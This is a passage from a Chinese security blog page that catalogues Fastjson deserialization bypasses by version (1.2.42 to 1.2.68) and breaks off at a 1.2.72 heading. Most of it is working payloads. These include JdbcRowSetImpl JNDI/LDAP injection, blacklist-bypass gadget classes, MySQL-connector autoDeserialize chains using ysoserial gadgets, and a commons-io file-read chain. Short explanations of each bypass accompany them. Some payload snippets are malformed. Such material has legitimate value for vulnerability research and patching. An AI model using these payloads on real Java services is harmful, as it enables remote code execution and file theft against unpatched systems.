做了一个校验，如果类名以L开头，;结尾，则会用stubstring()去除类名前的第一个L,<u>双写L即可绕过</u></p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autoTypeSupport </span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1: 1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Fastjson-x3D-1-2-43"><a href="#Fastjson-x3D-1-2-43" class="headerlink" title="Fastjson &#x3D; 1.2.43"></a><strong>Fastjson &#x3D; 1.2.43</strong></h2><h3 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h3><p>Fastjson &lt;&#x3D; 1.2.43开启autoTypeSupport</p><p>Fastjson &lt;&#x3D; 1.2.43，checkAutoType()对LL进行了判断，如果类以LL开头，抛出异常,但在 TypeUtils.loadClass中，还对[进行了处理，因此又可以通过[来进行绕过</p><p>TypeUtils#loadClass()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autoTypeSupport </span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span> [&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span> &#125;<br></code></pre></td></tr></table></figure><h2 id="Fastjson-x3D-1-2-44"><a href="#Fastjson-x3D-1-2-44" class="headerlink" title="Fastjson &#x3D; 1.2.44"></a><strong>Fastjson &#x3D; 1.2.44</strong></h2><p>修复了[的绕过，在checkAutoType中进行判断如果类名以[或L开头抛出异常。L[让绕 过方法失效，可使用JSON内置payload</p><h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Fastjson-x3D-1-2-47"><a href="#Fastjson-x3D-1-2-47" class="headerlink" title="Fastjson &#x3D; 1.2.47"></a><strong>Fastjson &#x3D; 1.2.47</strong></h2><h3 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h3><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport<br>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 autoTypeSupport开启或未开启均可利用</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67（要有依赖）"><a href="#1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67（要有依赖）" class="headerlink" title="1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67（要有依赖）"></a><strong>1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67</strong>（要有依赖）</h2><p>Fastjson1.2.48修复JSON内置绕过方法，此版本内多为针对黑名单绕过，需要相应组件才可使用</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>&lt;&#x3D;1.2.62</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//依赖</span><br><span class="hljs-comment">// &lt;dependency&gt;</span><br><span class="hljs-comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="hljs-comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span><br><span class="hljs-comment">//          &lt;version&gt;x.x&lt;/version&gt;</span><br><span class="hljs-comment">//     &lt;/dependency&gt;</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.</span><br><span class="hljs-string">0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>fastjson &lt;&#x3D; 1.2.66黑名单绕过，需autoTypeSupport属性为true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="hljs-string">&quot;jndiNames&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;proper</span><br><span class="hljs-string">ties:</span><br><span class="hljs-string">&#123;&quot;</span><span class="hljs-meta">@type</span><span class="hljs-string">&quot;:&quot;</span>java.util.Properties<span class="hljs-string">&quot;,&quot;</span>UserTransaction<span class="hljs-string">&quot;:&quot;</span>ldap:<span class="hljs-comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Fastjson-x3D-1-2-68-要有依赖"><a href="#Fastjson-x3D-1-2-68-要有依赖" class="headerlink" title="Fastjson &#x3D; 1.2.68(要有依赖)"></a><strong>Fastjson &#x3D; 1.2.68</strong>(要有依赖)</h2><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>FastJSON1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false,不影 响代码调用。经过源码分析，达到以下条件则可通过ParserConfig#checkAutoType()安全校验:</p><p>expectClass为空:</p><ol><li>typeNmae不在denyHashCodes黑名单中(必须条件)</li><li>SafeMode为false(必要条件，默认为false)</li><li>typeName在TypeUtils#mappings中且expectClass为空且typeName不为HashMap且不为</li></ol><p>expectClass子类 expectClass不为空:</p><ol><li>typeNmae和expectClass均不在denyHashCodes黑名单中(必须条件)</li><li>autoTypeSupport为false(默认为false)</li><li>expectClass在TypeUtils#mappings中</li><li>typeName不是ClassLoader、DataSource、RowSet的子类</li><li>expectClass不为null，且不为Object.class、Serializable.class、Cloneable.class、</li></ol><p>Closeable.class、EventListener.class、Iterable.class、Collection.class</p><ol start="6"><li>typeName是expectClass的子类</li></ol><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x.xx<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ServerStatusDiffInterceptor链</p><ul><li>5.1.0-5.1.10:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffI nterceptor&amp;user&#x3D;yso_JRE8u20_calc 连接后需执行查询 </li><li>5.1.11-5.x.xx:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffI nterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDif fInterceptor&amp;user&#x3D;yso_JRE8u20_calc (包名中添加cj)</li><li>8.0.20以下:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInte rceptor&amp;user&#x3D;yso_JRE8u20_calc</li></ul><p>detectCustomCollations链</p><ul><li>5.1.19-5.1.28:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.40:jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc </li><li>5.1.41 以上 不可用</li></ul><p>利用链分析</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">**queryInterceptors:**一个逗号分割的Class列表(实现了 com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.interceptors</span>.QueryInterceptor接口的Class)，在Query<span class="hljs-string">&quot;之间&quot;</span>进行执行来影响结 果。(效果上来看是在Query执行前后各插入一次操作) **autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。<br></code></pre></td></tr></table></figure><p>detectCustomCollations链:</p><ul><li>&lt;8.0.20: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInte rceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>6.x(属性名不同): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDif fInterceptor&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.11及以上的5.x版本(包名没有了cj): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc<br>detectCustomCollations触发:</li><li>5.1.41及以上: 不可用</li><li>5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc </li><li>5.1.28-5.1.19: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test? autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.18以下的5.1.x版本: 不可用 </li><li>5.0.x版本不可用</li><li>5.1.41版本后，不再使用getObject()获取”SHOW COLLATION”的结果，此链失效</li></ul><p>ServerStatusDiffInterceptor链:</p><p>payload 5.1.11-5.1.48</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CommonsCollections5&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 利用链 </span><br>      <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span> <br>      <span class="hljs-attr">&quot;statementInterceptors&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>payload 6.0.2&#x2F;6.0.3</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;connectionString&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span><br><span class="hljs-punctuation">&#125;</span> <br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>6.0.4中构造方法改变，此利用链无法使用</p></blockquote><p>payload 8.0.19</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;connectionUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;masters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;slaves&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;dbname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;queryInterceptors&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><br>     <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span> <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="文件写入读取"><a href="#文件写入读取" class="headerlink" title="文件写入读取"></a>文件写入读取</h4><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>x.x<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;abc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span><span class="hljs-comment">//此处传入URL,则此处可使用file jar http 等协议</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>          <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><br>          <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>                  <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">66</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br><span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这里用了FastJSON的特性<code>&quot;$ref&quot;&quot;: &quot;$.xx.yy&quot;</code>表示调用JSON对象中xx的yy属性的getter。payload中即调用 abc(org.apache.commons.io.input.BOMInputStream的BOM属性，即调用BOMInputStream的 getBOM()方法。</p></blockquote><h2 id="1-2-72-lt-Fastjson-lt-x3D-1-2-80"><a 